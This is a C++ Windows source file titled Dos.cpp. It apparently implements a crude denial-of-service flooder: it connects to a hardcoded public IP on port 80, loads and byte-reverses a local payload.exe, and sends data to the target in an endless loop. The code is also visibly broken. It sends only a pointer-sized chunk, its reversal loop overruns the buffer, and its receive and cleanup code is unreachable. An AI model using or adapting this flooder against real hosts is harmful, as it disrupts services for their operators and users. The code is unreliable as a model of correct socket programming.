// Dos.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <Winternl.h>
#include <cstdio>
#include <tlhelp32.h>
#include <comdef.h>
#include <string>
#include <vector>
#include <sstream>
#include <cstdlib>
#include <iostream>
#include <psapi.h>
#include <tchar.h>
#include <Winternl.h>
#include <string>
#include <tuple>
#include <vector>
#include <memory>
#include <Wtsapi32.h>                                                                                          
#include <stdlib.h>
#include <rpc.h>
#include <cstdio>
#include <stdexcept>
#include <array>
#include <stdlib.h> 
#include <dos.h>
#include <stdio.h>
#include <conio.h>
using namespace std;

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#include <iostream>
#include <winsock2.h>

using namespace std;

const int BUFFERSIZE = 20*4096;

int main()
{
	WSADATA WSAData;
	SOCKET server;
	SOCKADDR_IN addr;

	WSAStartup(MAKEWORD(2, 0), &WSAData);
	server = socket(AF_INET, SOCK_STREAM, 0);

	addr.sin_addr.s_addr = inet_addr("94.159.133.82"); 
	addr.sin_family = AF_INET;
	addr.sin_port = htons(80);

	connect(server, (SOCKADDR *)&addr, sizeof(addr));
	cout << "Connected to server!" << endl;

	//char buffer[1024] = { 'G','E','T',' ' ,'/', ' ' ,'H','T','T','P', '/', '1','.','1' }; //GET / HTTP/1.1
	const char * fname = "C:\\Users\\Default\\Dos\\Dos\\payload.exe";
	FILE* filp = fopen(fname, "rb");
	if (!filp) { printf("Error: could not open file %s\n", fname); return -1; }
	char * buffer = new char[BUFFERSIZE];
	while (int bytes = fread(buffer, sizeof(char), BUFFERSIZE, filp)) {
		// Do something with the bytes, first elements of buffer.
		// For example, reversing the data and forget about it afterwards!
		for (char *beg = buffer, *end = buffer + bytes; beg < end; beg++, end--) {
			swap(*beg, *end);
		}
	}
	while (true) {
		send(server, buffer, sizeof(buffer), 0);
		cout << "Message sent!" << endl;
	}
	char buff[1024];
	int Rs = recv(
		 server,
		buff,
		1024,
		0
	);
	string Msg = "";
	for (int j = 0;j < 1024;j++) {
		Msg += buff[j];
	}
	cout << Msg;
	closesocket(server);
	WSACleanup();
	cout << "Socket closed." << endl << endl;
	int y;
	cin >> y;
}